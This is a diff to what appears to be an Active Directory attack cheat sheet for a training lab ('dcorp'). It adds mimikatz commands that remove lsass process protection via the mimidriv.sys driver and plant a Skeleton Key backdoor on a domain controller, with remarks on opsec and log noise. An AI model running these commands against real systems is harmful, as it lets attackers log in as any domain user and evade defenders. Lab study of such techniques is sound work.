@@ -233,6 +233,30 @@ Invoke-Mimikatz -Command '"privilege::debug" "misc::skeleton"' -ComputerName dco
 
 
 ```powershell
-Enter-PSSession -Computername dcorp-dc -credential
-dcorp\Administrator
+Enter-PSSession -Computername dcorp-dc -credential dcorp\Administrator
 ```
+
+
+> Note that Skeleton Key is not opsec safe and is also known to cause issues with AD CS.
+
+
+- In case lsass is running as a protected process, we can still use Skeleton Key but it needs the mimikatz driver (mimidriv.sys) on disk of the target
+ 
+- DC:
+
+
+```
+mimikatz # privilege::debug
+mimikatz # !+
+mimikatz # !processprotect /process:lsass.exe /remove
+mimikatz # misc::skeleton
+mimikatz # !-
+```
+
+
+
+- Note that above would be very noisy in logs - Service installation (Kernel mode driver)
+
+
+
+
